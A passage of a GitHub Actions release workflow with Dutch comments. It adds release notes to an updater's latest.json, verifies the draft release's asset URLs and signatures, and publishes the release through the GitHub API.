          REPO: ${{ github.repository }}
        run: |
          set -euo pipefail
          node scripts/release-notes.mjs "$VERSION" --format=notes > release-notes.txt
          gh release download "$VERSION" --pattern "latest.json" --output latest.json --clobber --repo "$REPO"
          # ${...} en backticks zijn JavaScript; de shell mag ze niet uitbreiden.
          # shellcheck disable=SC2016
          node -e '
            const fs = require("node:fs");
            const latest = JSON.parse(fs.readFileSync("latest.json", "utf8"));
            latest.notes = fs.readFileSync("release-notes.txt", "utf8");
            fs.writeFileSync("latest.json", JSON.stringify(latest, null, 2));
            console.log(`notes: ${latest.notes.length} tekens, ${Object.keys(latest.platforms ?? {}).length} platform-entries`);
          '
          gh release upload "$VERSION" latest.json --clobber --repo "$REPO"

      # Laatste poort vóór publicatie: dezelfde controle als release-verify.yml,
      # maar op de draft. Elke platform-URL in latest.json wijst naar een asset
      # van deze release, elke signature is gelijk aan die .sig en verifieert
      # tegen de updater-pubkey, en alle tien platformsleutels zijn er. Bij een
      # FOUT blijft de release een draft. Zie docs/release-verificatie.md.
      - name: Controleer de draft vóór publicatie (verify-release.mjs --draft-id)
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          VERSION: ${{ needs.create-release.outputs.version }}
          RELEASE_ID: ${{ needs.create-release.outputs.release_id }}
          REPO: ${{ github.repository }}
        run: |
          set -euo pipefail
          mkdir -p "$RUNNER_TEMP/assets"
          status=0
          node scripts/verify-release.mjs "$VERSION" --repo "$REPO" --draft-id "$RELEASE_ID" \
            --dir "$RUNNER_TEMP/assets" --out "$RUNNER_TEMP/verify-release.md" > /dev/null || status=$?
          if [ -f "$RUNNER_TEMP/verify-release.md" ]; then cat "$RUNNER_TEMP/verify-release.md" >> "$GITHUB_STEP_SUMMARY"; fi
          if [ "$status" -ne 0 ]; then
            echo "::error::verify-release.mjs gaf exit $status; de release blijft een draft"
            exit 1
          fi

      - name: Publish release
        id: publish-release
        uses: actions/github-script@v8
        env:
          release_id: ${{ needs.create-release.outputs.release_id }}
        with:
          script: |
            await github.rest.repos.updateRelease({
              owner: context.repo.owner,
              repo: context.repo.repo,
              release_id: process.env.release_id,
              draft: false,
              prerelease: false
            });
